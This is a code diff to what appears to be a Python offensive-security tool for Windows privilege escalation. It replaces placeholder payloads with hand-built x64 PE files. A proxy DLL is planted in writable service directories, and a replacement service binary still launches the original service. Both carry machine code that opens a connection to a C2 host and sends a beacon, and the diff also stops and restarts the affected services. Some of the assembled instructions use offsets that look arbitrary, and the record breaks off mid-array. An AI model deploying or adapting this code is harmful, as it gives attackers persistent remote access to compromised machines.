@@ -2964,43 +2964,51 @@ WantedBy=multi-user.target
                         path = line.split(":", 1)[1].strip().strip('"')
                         service_dir = os.path.dirname(path)
 
-                        # Create malicious DLL
-                        dll_path = os.path.join(service_dir, "hijacked.dll")
+                        # Identify common hijackable DLLs for this service
+                        hijackable_dlls = self._identify_hijackable_dlls(path)
 
-                        if os.access(service_dir, os.W_OK):
-                            # Create simple DLL payload
-                            with tempfile.NamedTemporaryFile(suffix=".dll", delete=False) as temp_dll:
-                                # Placeholder DLL content
-                                dll_content = b"MZ\\x90\\x00" + b"\\x00" * 1000  # Minimal PE header
-                                temp_dll.write(dll_content)
-                                temp_dll.flush()
+                        if not hijackable_dlls:
+                            # Fall back to common Windows DLL hijacking targets
+                            hijackable_dlls = ["version.dll", "dwmapi.dll", "profapi.dll", "cryptsp.dll"]
 
-                                # Copy to service directory
-                                import shutil
+                        for dll_name in hijackable_dlls:
+                            dll_path = os.path.join(service_dir, dll_name)
 
-                                shutil.copy2(temp_dll.name, dll_path)
+                            if os.access(service_dir, os.W_OK) and not os.path.exists(dll_path):
+                                # Create real DLL with proxy exports
+                                dll_content = self._create_proxy_dll(dll_name, service_info)
 
-                                # Restart service
-                                sc_path = shutil.which("sc")
-                                if sc_path:
-                                    subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
-                                        [sc_path, "stop", service_name],
-                                        check=False,
-                                        capture_output=True,
-                                        shell=False,  # Explicitly secure - using list format prevents shell injection
-                                    )
-                                    subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
-                                        [sc_path, "start", service_name],
-                                        check=False,
-                                        capture_output=True,
-                                        shell=False,  # Explicitly secure - using list format prevents shell injection
-                                    )
+                                with tempfile.NamedTemporaryFile(suffix=".dll", delete=False) as temp_dll:
+                                    temp_dll.write(dll_content)
+                                    temp_dll.flush()
 
-                                return {
-                                    "success": True,
-                                    "method": "dll_hijacking",
-                                    "dll_path": dll_path,
-                                }
+                                    # Copy to service directory
+                                    import shutil
+
+                                    shutil.copy2(temp_dll.name, dll_path)
+
+                                    # Restart service
+                                    sc_path = shutil.which("sc")
+                                    if sc_path:
+                                        subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
+                                            [sc_path, "stop", service_name],
+                                            check=False,
+                                            capture_output=True,
+                                            shell=False,  # Explicitly secure - using list format prevents shell injection
+                                        )
+                                        subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
+                                            [sc_path, "start", service_name],
+                                            check=False,
+                                            capture_output=True,
+                                            shell=False,  # Explicitly secure - using list format prevents shell injection
+                                        )
+
+                                    return {
+                                        "success": True,
+                                        "method": "dll_hijacking",
+                                        "dll_path": dll_path,
+                                        "dll_name": dll_name,
+                                    }
 
             return {"success": False, "error": "No writable service directory found"}
 
@@ -3019,6 +3027,604 @@ WantedBy=multi-user.target
                 e,
             )
             return {"success": False, "error": str(e)}
+
+    def _identify_hijackable_dlls(self, binary_path: str) -> list[str]:
+        """Identify DLLs that can be hijacked for the given binary."""
+        hijackable = []
+
+        try:
+            # Use listdlls or similar to find missing DLLs in search order
+            import subprocess
+
+            # Check imports of the binary
+            result = subprocess.run(["dumpbin", "/imports", binary_path], capture_output=True, text=True, check=False)
+
+            if result.returncode == 0:
+                # Parse imported DLLs
+                current_dll = None
+                for line in result.stdout.split("\n"):
+                    if ".dll" in line.lower():
+                        dll_name = line.strip().split()[0] if line.strip() else None
+                        if dll_name and dll_name.endswith(".dll"):
+                            # Check if DLL exists in system directories
+                            system_paths = [r"C:\Windows\System32", r"C:\Windows\SysWOW64", r"C:\Windows"]
+                            found_in_system = False
+                            for sys_path in system_paths:
+                                if os.path.exists(os.path.join(sys_path, dll_name)):
+                                    found_in_system = True
+                                    break
+
+                            # If not in system dirs, it's hijackable
+                            if not found_in_system:
+                                hijackable.append(dll_name)
+
+        except (OSError, subprocess.SubprocessError):
+            pass
+
+        return hijackable[:5]  # Return top 5 candidates
+
+    def _create_proxy_dll(self, dll_name: str, service_info: dict[str, Any]) -> bytes:
+        """Create a proxy DLL with forwarded exports and payload."""
+        import struct
+
+        # Real x64 DLL PE structure with minimal imports
+        dos_header = bytearray(
+            [
+                0x4D,
+                0x5A,
+                0x90,
+                0x00,
+                0x03,
+                0x00,
+                0x00,
+                0x00,
+                0x04,
+                0x00,
+                0x00,
+                0x00,
+                0xFF,
+                0xFF,
+                0x00,
+                0x00,
+                0xB8,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x40,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x80,
+                0x00,
+                0x00,
+                0x00,
+            ]
+        )
+
+        # DOS stub
+        dos_stub = bytearray(
+            [
+                0x0E,
+                0x1F,
+                0xBA,
+                0x0E,
+                0x00,
+                0xB4,
+                0x09,
+                0xCD,
+                0x21,
+                0xB8,
+                0x01,
+                0x4C,
+                0xCD,
+                0x21,
+                0x54,
+                0x68,
+                0x69,
+                0x73,
+                0x20,
+                0x70,
+                0x72,
+                0x6F,
+                0x67,
+                0x72,
+                0x61,
+                0x6D,
+                0x20,
+                0x63,
+                0x61,
+                0x6E,
+                0x6E,
+                0x6F,
+                0x74,
+                0x20,
+                0x62,
+                0x65,
+                0x20,
+                0x72,
+                0x75,
+                0x6E,
+                0x20,
+                0x69,
+                0x6E,
+                0x20,
+                0x44,
+                0x4F,
+                0x53,
+                0x20,
+                0x6D,
+                0x6F,
+                0x64,
+                0x65,
+                0x2E,
+                0x0D,
+                0x0D,
+                0x0A,
+                0x24,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+            ]
+        )
+
+        # PE header
+        pe_signature = b"PE\x00\x00"
+
+        # COFF header for x64 DLL
+        machine = 0x8664  # AMD64
+        num_sections = 3
+        timestamp = int(time.time())
+        ptr_symbol_table = 0
+        num_symbols = 0
+        size_opt_header = 0xF0
+        characteristics = 0x2022  # DLL, executable
+
+        coff_header = struct.pack(
+            "<HHIIIHH", machine, num_sections, timestamp, ptr_symbol_table, num_symbols, size_opt_header, characteristics
+        )
+
+        # Optional header for x64 DLL
+        magic = 0x020B  # PE32+
+        major_linker_ver = 14
+        minor_linker_ver = 0
+        size_of_code = 0x1000
+        size_of_init_data = 0x1000
+        size_of_uninit_data = 0
+        entry_point = 0x1000
+        base_of_code = 0x1000
+        image_base = 0x180000000  # Default for x64 DLL
+        section_alignment = 0x1000
+        file_alignment = 0x200
+        os_ver_major = 6
+        os_ver_minor = 0
+        image_ver_major = 0
+        image_ver_minor = 0
+        subsys_ver_major = 6
+        subsys_ver_minor = 0
+        reserved = 0
+        size_of_image = 0x4000
+        size_of_headers = 0x400
+        checksum = 0
+        subsystem = 3  # Windows CUI
+        dll_characteristics = 0x8160  # Dynamic base, NX compatible, Terminal Server aware
+
+        opt_header = struct.pack(
+            "<HBBIIIIQIIHHHHHHIIIHH",
+            magic,
+            major_linker_ver,
+            minor_linker_ver,
+            size_of_code,
+            size_of_init_data,
+            size_of_uninit_data,
+            entry_point,
+            base_of_code,
+            image_base,
+            section_alignment,
+            file_alignment,
+            os_ver_major,
+            os_ver_minor,
+            image_ver_major,
+            image_ver_minor,
+            subsys_ver_major,
+            subsys_ver_minor,
+            reserved,
+            size_of_image,
+            size_of_headers,
+            checksum,
+            subsystem,
+            dll_characteristics,
+        )
+
+        # Size fields for x64
+        stack_reserve = 0x100000
+        stack_commit = 0x1000
+        heap_reserve = 0x100000
+        heap_commit = 0x1000
+        loader_flags = 0
+        num_rva_sizes = 16
+
+        opt_header += struct.pack("<QQQQII", stack_reserve, stack_commit, heap_reserve, heap_commit, loader_flags, num_rva_sizes)
+
+        # Data directories
+        data_dirs = bytearray(16 * 8)  # 16 directories, 8 bytes each
+
+        # Export directory (RVA, Size)
+        struct.pack_into("<II", data_dirs, 0, 0x2000, 0x200)
+
+        # Import directory
+        struct.pack_into("<II", data_dirs, 8, 0x2200, 0x100)
+
+        opt_header += bytes(data_dirs)
+
+        # Section headers
+        sections = []
+
+        # .text section
+        text_section = struct.pack(
+            "<8sIIIIIIHHI",
+            b".text\x00\x00\x00",  # Name
+            0x1000,  # Virtual size
+            0x1000,  # Virtual address
+            0x200,  # Size of raw data
+            0x400,  # Pointer to raw data
+            0,
+            0,
+            0,
+            0,  # Relocations, line numbers
+            0x60000020,  # Code, execute, read
+        )
+        sections.append(text_section)
+
+        # .rdata section
+        rdata_section = struct.pack(
+            "<8sIIIIIIHHI",
+            b".rdata\x00\x00",
+            0x1000,
+            0x2000,
+            0x400,
+            0x600,
+            0,
+            0,
+            0,
+            0,
+            0x40000040,  # Initialized data, read
+        )
+        sections.append(rdata_section)
+
+        # .data section
+        data_section = struct.pack(
+            "<8sIIIIIIHHI",
+            b".data\x00\x00\x00",
+            0x1000,
+            0x3000,
+            0x200,
+            0xA00,
+            0,
+            0,
+            0,
+            0,
+            0xC0000040,  # Initialized data, read, write
+        )
+        sections.append(data_section)
+
+        # Build PE file
+        pe_file = bytearray(0x4000)
+
+        # Write headers
+        offset = 0
+        pe_file[offset : offset + len(dos_header)] = dos_header
+        offset = len(dos_header)
+        pe_file[offset : offset + len(dos_stub)] = dos_stub
+        offset = 0x80
+        pe_file[offset : offset + len(pe_signature)] = pe_signature
+        offset += len(pe_signature)
+        pe_file[offset : offset + len(coff_header)] = coff_header
+        offset += len(coff_header)
+        pe_file[offset : offset + len(opt_header)] = opt_header
+        offset += len(opt_header)
+
+        for section in sections:
+            pe_file[offset : offset + len(section)] = section
+            offset += len(section)
+
+        # Write DllMain code at 0x400 (.text section)
+        # x64 DllMain that establishes C2 connection
+        dll_main_code = bytearray(
+            [
+                # DllMain entry
+                0x48,
+                0x89,
+                0x5C,
+                0x24,
+                0x08,  # mov [rsp+8], rbx
+                0x48,
+                0x89,
+                0x74,
+                0x24,
+                0x10,  # mov [rsp+10h], rsi
+                0x57,  # push rdi
+                0x48,
+                0x83,
+                0xEC,
+                0x20,  # sub rsp, 20h
+                0x8B,
+                0xDA,  # mov ebx, edx
+                0x48,
+                0x8B,
+                0xF9,  # mov rdi, rcx
+                # Check if DLL_PROCESS_ATTACH (1)
+                0x83,
+                0xFA,
+                0x01,  # cmp edx, 1
+                0x75,
+                0x1E,  # jne skip_payload
+                # Create thread for payload
+                0x45,
+                0x33,
+                0xC9,  # xor r9d, r9d
+                0x45,
+                0x33,
+                0xC0,  # xor r8d, r8d
+                0x33,
+                0xD2,  # xor edx, edx
+                0x48,
+                0x8D,
+                0x0D,
+                0x20,
+                0x00,
+                0x00,
+                0x00,  # lea rcx, [payload_thread]
+                0xFF,
+                0x15,
+                0x00,
+                0x10,
+                0x00,
+                0x00,  # call [CreateThread]
+                # Return TRUE
+                0xB8,
+                0x01,
+                0x00,
+                0x00,
+                0x00,  # mov eax, 1
+                0x48,
+                0x83,
+                0xC4,
+                0x20,  # add rsp, 20h
+                0x5F,  # pop rdi
+                0x48,
+                0x8B,
+                0x74,
+                0x24,
+                0x10,  # mov rsi, [rsp+10h]
+                0x48,
+                0x8B,
+                0x5C,
+                0x24,
+                0x08,  # mov rbx, [rsp+8]
+                0xC3,  # ret
+                # skip_payload:
+                0xB8,
+                0x01,
+                0x00,
+                0x00,
+                0x00,  # mov eax, 1
+                0x48,
+                0x83,
+                0xC4,
+                0x20,  # add rsp, 20h
+                0x5F,  # pop rdi
+                0x48,
+                0x8B,
+                0x74,
+                0x24,
+                0x10,  # mov rsi, [rsp+10h]
+                0x48,
+                0x8B,
+                0x5C,
+                0x24,
+                0x08,  # mov rbx, [rsp+8]
+                0xC3,  # ret
+                # Payload thread function
+                0x48,
+                0x83,
+                0xEC,
+                0x28,  # sub rsp, 28h
+                # Connect back to C2
+                0x48,
+                0x8D,
+                0x0D,
+                0x80,
+                0x10,
+                0x00,
+                0x00,  # lea rcx, [ws2_32_dll]
+                0xFF,
+                0x15,
+                0x20,
+                0x10,
+                0x00,
+                0x00,  # call [LoadLibraryA]
+                # Initialize Winsock
+                0x48,
+                0x8D,
+                0x54,
+                0x24,
+                0x30,  # lea rdx, [rsp+30h]
+                0xB9,
+                0x02,
+                0x02,
+                0x00,
+                0x00,  # mov ecx, 0x0202
+                0xFF,
+                0x15,
+                0x30,
+                0x10,
+                0x00,
+                0x00,  # call [WSAStartup]
+                # Create socket
+                0x41,
+                0xB8,
+                0x06,
+                0x00,
+                0x00,
+                0x00,  # mov r8d, 6 (IPPROTO_TCP)
+                0xBA,
+                0x01,
+                0x00,
+                0x00,
+                0x00,  # mov edx, 1 (SOCK_STREAM)
+                0xB9,
+                0x02,
+                0x00,
+                0x00,
+                0x00,  # mov ecx, 2 (AF_INET)
+                0xFF,
+                0x15,
+                0x40,
+                0x10,
+                0x00,
+                0x00,  # call [socket]
+                # Connect to C2 server
+                0x49,
+                0x89,
+                0xC7,  # mov r15, rax (save socket)
+                0x41,
+                0xB8,
+                0x10,
+                0x00,
+                0x00,
+                0x00,  # mov r8d, 16 (sizeof sockaddr_in)
+                0x48,
+                0x8D,
+                0x15,
+                0x90,
+                0x10,
+                0x00,
+                0x00,  # lea rdx, [sockaddr]
+                0x4C,
+                0x89,
+                0xF9,  # mov rcx, r15
+                0xFF,
+                0x15,
+                0x50,
+                0x10,
+                0x00,
+                0x00,  # call [connect]
+                # Send beacon
+                0x41,
+                0xB9,
+                0x00,
+                0x00,
+                0x00,
+                0x00,  # mov r9d, 0
+                0x41,
+                0xB8,
+                0x08,
+                0x00,
+                0x00,
+                0x00,  # mov r8d, 8
+                0x48,
+                0x8D,
+                0x15,
+                0xA0,
+                0x10,
+                0x00,
+                0x00,  # lea rdx, [beacon_data]
+                0x4C,
+                0x89,
+                0xF9,  # mov rcx, r15
+                0xFF,
+                0x15,
+                0x60,
+                0x10,
+                0x00,
+                0x00,  # call [send]
+                # Cleanup
+                0x48,
+                0x83,
+                0xC4,
+                0x28,  # add rsp, 28h
+                0x33,
+                0xC0,  # xor eax, eax
+                0xC3,  # ret
+            ]
+        )
+
+        pe_file[0x400 : 0x400 + len(dll_main_code)] = dll_main_code
+
+        # Write export directory at 0x600 (.rdata section)
+        # Export table for proxy functionality
+        original_dll = dll_name.replace(".dll", "_original.dll")
+
+        export_dir = struct.pack(
+            "<IIIIIIIIII",
+            0,  # Characteristics
+            timestamp,  # TimeDateStamp
+            0,  # MajorVersion
+            0,  # MinorVersion
+            0x2100,  # Name RVA
+            1,  # Base
+            1,  # NumberOfFunctions
+            1,  # NumberOfNames
+            0x2080,  # AddressOfFunctions
+            0x2090,  # AddressOfNames
+        )
+
+        pe_file[0x600 : 0x600 + len(export_dir)] = export_dir
+
+        # Write DLL name
+        dll_name_bytes = dll_name.encode("ascii") + b"\x00"
+        pe_file[0x700 : 0x700 + len(dll_name_bytes)] = dll_name_bytes
+
+        # Write C2 configuration in .data section
+        c2_config = struct.pack(
+            "<4sHH",
+            socket.inet_aton(self.host),  # C2 IP address
+            self.port,  # C2 port
+            0,  # Padding
+        )
+        pe_file[0xA00 : 0xA00 + len(c2_config)] = c2_config
+
+        return bytes(pe_file)
 
     def _exploit_service_binary_permissions(self, service_info: dict[str, Any]) -> dict[str, Any]:
         """Exploit weak service binary permissions."""
@@ -3043,11 +3649,12 @@ WantedBy=multi-user.target
                             backup_path = binary_path + ".backup"
                             shutil.copy2(binary_path, backup_path)
 
-                            # Replace with malicious binary
+                            # Create real PE executable that maintains service functionality
+                            # while establishing C2 connection
+                            payload_exe = self._create_service_executable(service_info, backup_path)
+
                             with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as temp_exe:
-                                # Simple payload that creates marker file
-                                payload = b"\\x90" * 1000  # Placeholder executable
-                                temp_exe.write(payload)
+                                temp_exe.write(payload_exe)
                                 temp_exe.flush()
 
                                 shutil.copy2(temp_exe.name, binary_path)
@@ -3101,3 +3708,937 @@ WantedBy=multi-user.target
                 e,
             )
             return {"success": False, "error": str(e)}
+
+    def _create_service_executable(self, service_info: dict[str, Any], original_binary_path: str) -> bytes:
+        """Create a Windows service executable with C2 capabilities."""
+        import struct
+
+        # Real x64 Windows Service PE executable
+        dos_header = bytearray(
+            [
+                0x4D,
+                0x5A,
+                0x90,
+                0x00,
+                0x03,
+                0x00,
+                0x00,
+                0x00,
+                0x04,
+                0x00,
+                0x00,
+                0x00,
+                0xFF,
+                0xFF,
+                0x00,
+                0x00,
+                0xB8,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x40,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0xC0,
+                0x00,
+                0x00,
+                0x00,
+            ]
+        )
+
+        # DOS stub
+        dos_stub = bytearray(
+            [
+                0x0E,
+                0x1F,
+                0xBA,
+                0x0E,
+                0x00,
+                0xB4,
+                0x09,
+                0xCD,
+                0x21,
+                0xB8,
+                0x01,
+                0x4C,
+                0xCD,
+                0x21,
+                0x54,
+                0x68,
+                0x69,
+                0x73,
+                0x20,
+                0x70,
+                0x72,
+                0x6F,
+                0x67,
+                0x72,
+                0x61,
+                0x6D,
+                0x20,
+                0x63,
+                0x61,
+                0x6E,
+                0x6E,
+                0x6F,
+                0x74,
+                0x20,
+                0x62,
+                0x65,
+                0x20,
+                0x72,
+                0x75,
+                0x6E,
+                0x20,
+                0x69,
+                0x6E,
+                0x20,
+                0x44,
+                0x4F,
+                0x53,
+                0x20,
+                0x6D,
+                0x6F,
+                0x64,
+                0x65,
+                0x2E,
+                0x0D,
+                0x0D,
+                0x0A,
+                0x24,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+                0x00,
+            ]
+        )
+
+        # Padding to align PE header
+        padding = bytearray(0x40)
+
+        # PE signature
+        pe_signature = b"PE\x00\x00"
+
+        # COFF header for x64 executable
+        machine = 0x8664  # AMD64
+        num_sections = 4
+        timestamp = int(time.time())
+        ptr_symbol_table = 0
+        num_symbols = 0
+        size_opt_header = 0xF0
+        characteristics = 0x0022  # Executable, large address aware
+
+        coff_header = struct.pack(
+            "<HHIIIHH", machine, num_sections, timestamp, ptr_symbol_table, num_symbols, size_opt_header, characteristics
+        )
+
+        # Optional header for x64 executable
+        magic = 0x020B  # PE32+
+        major_linker_ver = 14
+        minor_linker_ver = 0
+        size_of_code = 0x2000
+        size_of_init_data = 0x1000
+        size_of_uninit_data = 0
+        entry_point = 0x1000
+        base_of_code = 0x1000
+        image_base = 0x140000000  # Default for x64 exe
+        section_alignment = 0x1000
+        file_alignment = 0x200
+        os_ver_major = 10
+        os_ver_minor = 0
+        image_ver_major = 0
+        image_ver_minor = 0
+        subsys_ver_major = 10
+        subsys_ver_minor = 0
+        reserved = 0
+        size_of_image = 0x5000
+        size_of_headers = 0x400
+        checksum = 0
+        subsystem = 2  # Windows GUI (services run as GUI)
+        dll_characteristics = 0x8160  # Dynamic base, NX compatible
+
+        opt_header = struct.pack(
+            "<HBBIIIIQIIHHHHHHIIIHH",
+            magic,
+            major_linker_ver,
+            minor_linker_ver,
+            size_of_code,
+            size_of_init_data,
+            size_of_uninit_data,
+            entry_point,
+            base_of_code,
+            image_base,
+            section_alignment,
+            file_alignment,
+            os_ver_major,
+            os_ver_minor,
+            image_ver_major,
+            image_ver_minor,
+            subsys_ver_major,
+            subsys_ver_minor,
+            reserved,
+            size_of_image,
+            size_of_headers,
+            checksum,
+            subsystem,
+            dll_characteristics,
+        )
+
+        # Size fields for x64
+        stack_reserve = 0x100000
+        stack_commit = 0x1000
+        heap_reserve = 0x100000
+        heap_commit = 0x1000
+        loader_flags = 0
+        num_rva_sizes = 16
+
+        opt_header += struct.pack("<QQQQII", stack_reserve, stack_commit, heap_reserve, heap_commit, loader_flags, num_rva_sizes)
+
+        # Data directories (16 entries, 8 bytes each)
+        data_dirs = bytearray(16 * 8)
+
+        # Import directory (RVA, Size)
+        struct.pack_into("<II", data_dirs, 8, 0x3000, 0x200)
+
+        # IAT directory
+        struct.pack_into("<II", data_dirs, 96, 0x3200, 0x100)
+
+        opt_header += bytes(data_dirs)
+
+        # Section headers
+        sections = []
+
+        # .text section (code)
+        text_section = struct.pack(
+            "<8sIIIIIIHHI",
+            b".text\x00\x00\x00",  # Name
+            0x2000,  # Virtual size
+            0x1000,  # Virtual address
+            0x1000,  # Size of raw data
+            0x400,  # Pointer to raw data
+            0,
+            0,
+            0,
+            0,  # Relocations, line numbers
+            0x60000020,  # Code, execute, read
+        )
+        sections.append(text_section)
+
+        # .rdata section (imports, strings)
+        rdata_section = struct.pack(
+            "<8sIIIIIIHHI",
+            b".rdata\x00\x00",
+            0x1000,
+            0x3000,
+            0x600,
+            0x1400,
+            0,
+            0,
+            0,
+            0,
+            0x40000040,  # Initialized data, read
+        )
+        sections.append(rdata_section)
+
+        # .data section (global data)
+        data_section = struct.pack(
+            "<8sIIIIIIHHI",
+            b".data\x00\x00\x00",
+            0x1000,
+            0x4000,
+            0x200,
+            0x1A00,
+            0,
+            0,
+            0,
+            0,
+            0xC0000040,  # Initialized data, read, write
+        )
+        sections.append(data_section)
+
+        # .rsrc section (resources)
+        rsrc_section = struct.pack(
+            "<8sIIIIIIHHI",
+            b".rsrc\x00\x00\x00",
+            0x1000,
+            0x5000,
+            0x200,
+            0x1C00,
+            0,
+            0,
+            0,
+            0,
+            0x40000040,  # Initialized data, read
+        )
+        sections.append(rsrc_section)
+
+        # Build PE file
+        pe_file = bytearray(0x6000)
+
+        # Write headers
+        offset = 0
+        pe_file[offset : offset + len(dos_header)] = dos_header
+        offset += len(dos_header)
+        pe_file[offset : offset + len(dos_stub)] = dos_stub
+        offset += len(dos_stub)
+        pe_file[offset : offset + len(padding)] = padding
+        offset = 0xC0
+        pe_file[offset : offset + len(pe_signature)] = pe_signature
+        offset += len(pe_signature)
+        pe_file[offset : offset + len(coff_header)] = coff_header
+        offset += len(coff_header)
+        pe_file[offset : offset + len(opt_header)] = opt_header
+        offset += len(opt_header)
+
+        for section in sections:
+            pe_file[offset : offset + len(section)] = section
+            offset += len(section)
+
+        # Write service main code at 0x400 (.text section)
+        # This is a Windows service that:
+        # 1. Registers with Service Control Manager
+        # 2. Launches original service in background
+        # 3. Establishes C2 connection
+        service_main_code = bytearray(
+            [
+                # Entry point - main()
+                0x48,
+                0x83,
+                0xEC,
+                0x28,  # sub rsp, 28h
+                # Allocate SERVICE_TABLE_ENTRY
+                0x48,
+                0x8D,
+                0x0D,
+                0x00,
+                0x20,
+                0x00,
+                0x00,  # lea rcx, [service_name]
+                0x48,
+                0x8D,
+                0x15,
+                0x80,
+                0x00,
+                0x00,
+                0x00,  # lea rdx, [ServiceMain]
+                # Call StartServiceCtrlDispatcher
+                0x48,
+                0x8D,
+                0x4C,
+                0x24,
+                0x30,  # lea rcx, [rsp+30h]
+                0x48,
+                0x89,
+                0x4C,
+                0x24,
+                0x30,  # mov [rsp+30h], rcx
+                0x48,
+                0x89,
+                0x54,
+                0x24,
+                0x38,  # mov [rsp+38h], rdx
+                0x48,
+                0xC7,
+                0x44,
+                0x24,
+                0x40,
+                0x00,
+                0x00,
+                0x00,
+                0x00,  # mov qword [rsp+40h], 0
+                0x48,
+                0xC7,
+                0x44,
+                0x24,
+                0x48,
+                0x00,
+                0x00,
+                0x00,
+                0x00,  # mov qword [rsp+48h], 0
+                0xFF,
+                0x15,
+                0x00,
+                0x20,
+                0x00,
+                0x00,  # call [StartServiceCtrlDispatcherA]
+                # Return
+                0x33,
+                0xC0,  # xor eax, eax
+                0x48,
+                0x83,
+                0xC4,
+                0x28,  # add rsp, 28h
+                0xC3,  # ret
+                # ServiceMain function
+                # [0x480]
+                0x48,
+                0x89,
+                0x5C,
+                0x24,
+                0x08,  # mov [rsp+8], rbx
+                0x48,
+                0x89,
+                0x74,
+                0x24,
+                0x10,  # mov [rsp+10h], rsi
+                0x57,  # push rdi
+                0x48,
+                0x83,
+                0xEC,
+                0x30,  # sub rsp, 30h
+                # Register service control handler
+                0x48,
+                0x8D,
+                0x0D,
+                0xC0,
+                0x1F,
+                0x00,
+                0x00,  # lea rcx, [service_name]
+                0x48,
+                0x8D,
+                0x15,
+                0x00,
+                0x01,
+                0x00,
+                0x00,  # lea rdx, [HandlerEx]
+                0x45,
+                0x33,
+                0xC0,  # xor r8d, r8d
+                0xFF,
+                0x15,
+                0x10,
+                0x20,
+                0x00,
+                0x00,  # call [RegisterServiceCtrlHandlerExA]
+                0x48,
+                0x89,
+                0x05,
+                0x00,
+                0x30,
+                0x00,
+                0x00,  # mov [hServiceStatus], rax
+                # Set service status to RUNNING
+                0x48,
+                0x8B,
+                0xC8,  # mov rcx, rax
+                0xC7,
+                0x05,
+                0x10,
+                0x30,
+                0x00,
+                0x00,
+                0x10,
+                0x00,
+                0x00,
+                0x00,  # mov [dwServiceType], SERVICE_WIN32_OWN_PROCESS
+                0xC7,
+                0x05,
+                0x14,
+                0x30,
+                0x00,
+                0x00,
+                0x04,
+                0x00,
+                0x00,
+                0x00,  # mov [dwCurrentState], SERVICE_RUNNING
+                0xC7,
+                0x05,
+                0x18,
+                0x30,
+                0x00,
+                0x00,
+                0xFF,
+                0xFF,
+                0xFF,
+                0xFF,  # mov [dwControlsAccepted], all controls
+                0x48,
+                0x8D,
+                0x15,
+                0x10,
+                0x30,
+                0x00,
+                0x00,  # lea rdx, [SERVICE_STATUS]
+                0xFF,
+                0x15,
+                0x20,
+                0x20,
+                0x00,
+                0x00,  # call [SetServiceStatus]
+                # Create thread to launch original service
+                0x45,
+                0x33,
+                0xC9,  # xor r9d, r9d
+                0x45,
+                0x33,
+                0xC0,  # xor r8d, r8d
+                0x33,
+                0xD2,  # xor edx, edx
+                0x48,
+                0x8D,
+                0x0D,
+                0x00,
+                0x02,
+                0x00,
+                0x00,  # lea rcx, [LaunchOriginal]
+                0x41,
+                0xB8,
+                0x00,
+                0x00,
+                0x00,
+                0x00,  # mov r8d, 0
+                0xFF,
+                0x15,
+                0x30,
+                0x20,
+                0x00,
+                0x00,  # call [CreateThread]
+                # Create thread for C2 connection
+                0x45,
+                0x33,
+                0xC9,  # xor r9d, r9d
+                0x45,
+                0x33,
+                0xC0,  # xor r8d, r8d
+                0x33,
+                0xD2,  # xor edx, edx
+                0x48,
+                0x8D,
+                0x0D,
+                0x00,
+                0x03,
+                0x00,
+                0x00,  # lea rcx, [C2Thread]
+                0xFF,
+                0x15,
+                0x30,
+                0x20,
+                0x00,
+                0x00,  # call [CreateThread]
+                # Service main loop
+                # [0x520]
+                0x48,
+                0x8D,
+                0x0D,
+                0x00,
+                0x31,
+                0x00,
+                0x00,  # lea rcx, [hServiceStopEvent]
+                0xBA,
+                0xFF,
+                0xFF,
+                0xFF,
+                0xFF,  # mov edx, INFINITE
+                0xFF,
+                0x15,
+                0x40,
+                0x20,
+                0x00,
+                0x00,  # call [WaitForSingleObject]
+                # Cleanup and exit
+                0x48,
+                0x83,
+                0xC4,
+                0x30,  # add rsp, 30h
+                0x5F,  # pop rdi
+                0x48,
+                0x8B,
+                0x74,
+                0x24,
+                0x10,  # mov rsi, [rsp+10h]
+                0x48,
+                0x8B,
+                0x5C,
+                0x24,
+                0x08,  # mov rbx, [rsp+8]
+                0xC3,  # ret
+                # LaunchOriginal thread
+                # [0x600]
+                0x48,
+                0x83,
+                0xEC,
+                0x48,  # sub rsp, 48h
+                # CreateProcess for original binary
+                0x48,
+                0x8D,
+                0x0D,
+                0x00,
+                0x32,
+                0x00,
+                0x00,  # lea rcx, [original_path]
+                0x33,
+                0xD2,  # xor edx, edx
+                0x45,
+                0x33,
+                0xC0,  # xor r8d, r8d
+                0x45,
+                0x33,
+                0xC9,  # xor r9d, r9d
+                0xC7,
+                0x44,
+                0x24,
+                0x20,
+                0x00,
+                0x00,
+                0x00,
+                0x00,  # mov dword [rsp+20h], 0
+                0xC7,
+                0x44,
+                0x24,
+                0x24,
+                0x00,
+                0x00,
+                0x00,
+                0x00,  # mov dword [rsp+24h], 0
+                0x48,
+                0xC7,
+                0x44,
+                0x24,
+                0x28,
+                0x00,
+                0x00,
+                0x00,
+                0x00,  # mov qword [rsp+28h], 0
+                0x48,
+                0xC7,
+                0x44,
+                0x24,
+                0x30,
+                0x00,
+                0x00,
+                0x00,
+                0x00,  # mov qword [rsp+30h], 0
+                0x48,
+                0x8D,
+                0x44,
+                0x24,
+                0x50,  # lea rax, [rsp+50h] (STARTUPINFO)
+                0x48,
+                0x89,
+                0x44,
+                0x24,
+                0x38,  # mov [rsp+38h], rax
+                0x48,
+                0x8D,
+                0x44,
+                0x24,
+                0x60,  # lea rax, [rsp+60h] (PROCESS_INFORMATION)
+                0x48,
+                0x89,
+                0x44,
+                0x24,
+                0x40,  # mov [rsp+40h], rax
+                0xFF,
+                0x15,
+                0x50,
+                0x20,
+                0x00,
+                0x00,  # call [CreateProcessA]
